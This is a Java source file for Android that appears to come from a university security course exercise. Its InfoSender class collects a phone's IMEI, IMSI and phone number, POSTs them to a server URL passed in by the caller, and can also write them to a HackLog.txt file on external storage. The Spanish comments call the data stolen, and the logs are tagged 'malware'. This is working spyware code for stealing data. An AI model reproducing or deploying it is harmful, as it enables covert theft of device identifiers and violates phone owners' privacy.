package uvigo.teleco.deny.seguridad15;

import android.app.Activity;
import android.content.Context;
import android.os.Environment;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Deny on 17/11/2014.
 */
public class InfoSender extends Thread {
    private String url="";
    private String imei="";
    private String imsi="";
    private String number="";
    public InfoSender() {
    }

    public InfoSender(String url,String imei,String imsi,String number){
        this.url=url;
        this.imei=imei;
        this.imsi=imsi;
        this.number=number;
        if(imei.equals(null) || imei.equals(""))
            this.imei="Default IMEI";
        if(imsi.equals(null) || imsi.equals(""))
            this.imsi= "Default IMSI";
        if(number.equals(null) || number.equals(""))
            this.number="Default Number";
    }

    @Override
    public void run() {
        SendToServer(); //esta funcion me serviria si tuviese un servidor con php consiguiendo lo q le mandes sin embargo intentaré enviarmelo por email aunque no se si se podra

    }

    public void writeToFile() {
        try {
            Log.d("malware", "Voy a intentar escribir en el archivo");
            String path = Environment.getExternalStorageDirectory().getPath();
            File fl = new File(path+"/HackLog.txt");
            BufferedWriter bw = new BufferedWriter(new FileWriter(fl));
            bw.write("Tu IMEI es " + imei);
            bw.newLine();
            bw.write("Tu IMSI es " + imsi);
            bw.newLine();
            bw.write("Tu numero es " + number);
            bw.newLine();
            bw.close();
            Log.d("malware", "acabe de escribir en el archivo");
        }catch(IOException e) {
            Log.d("malware", "No pude abrir un archivo");
            System.out.println(e.getMessage());
            return;
        }

    }
    public String SendToServer() {
        HttpClient cliente = new DefaultHttpClient();
        HttpPost post = new HttpPost(url);

        try {
            List Datos = new ArrayList(2);
            //aqui relleno la lista con los datos que he robado
            Datos.add(new BasicNameValuePair("imei",imei));
            Datos.add(new BasicNameValuePair("imsi",imsi));
            Datos.add(new BasicNameValuePair("number",number));

            post.setEntity(new UrlEncodedFormEntity(Datos));
            //mando la informacion al servidor
            HttpResponse respuesta= cliente.execute(post);

            return respuesta.toString();

        }catch(Exception e){
            return e.getMessage();
        }

    }
}
